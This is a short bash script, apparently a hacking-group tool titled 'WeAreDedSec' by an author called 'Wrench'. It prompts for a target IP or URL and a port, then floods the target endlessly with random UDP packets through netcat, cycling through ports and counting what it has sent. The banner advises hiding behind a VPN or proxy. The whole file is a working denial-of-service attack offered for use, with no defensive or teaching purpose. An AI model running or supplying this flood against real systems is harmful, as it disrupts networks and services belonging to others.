#!/bin/bash

# Limpar a tela
clear

# Exibir o banner
echo "WeAreDedSec"
echo
echo "Author   : Wrench"
echo "Instagram : @jeanseven"
echo "github   : https://github.com/Jeanpseven"
echo "USE VPN ou PROXY (recommended:https://github.com/Jeanpseven/Dr4xVPN)"
echo
echo "Este script permite usar um IP ou uma URL como alvo."
echo

# Solicitar o alvo (pode ser um IP ou URL)
read -p "IP Target or URL: " target

# Solicitar a porta de destino
read -p "Port       : " port

# Função para gerar pacotes aleatórios
generate_packet() {
  dd if=/dev/urandom bs=1490 count=1 2>/dev/null
}

# Exibir mensagem de início
clear
echo "Cyber Bombing Started"
echo

sent=0
port_start="$port"
while true; do
  generate_packet | nc -u -w 1 -q 0 "$target" "$port"
  sent=$((sent + 1))
  port=$((port + 1))
  echo "Sent $sent packet to $target throught port:$port"
  if [ "$port" -eq 65534 ]; then
    port="$port_start"
  fi
done
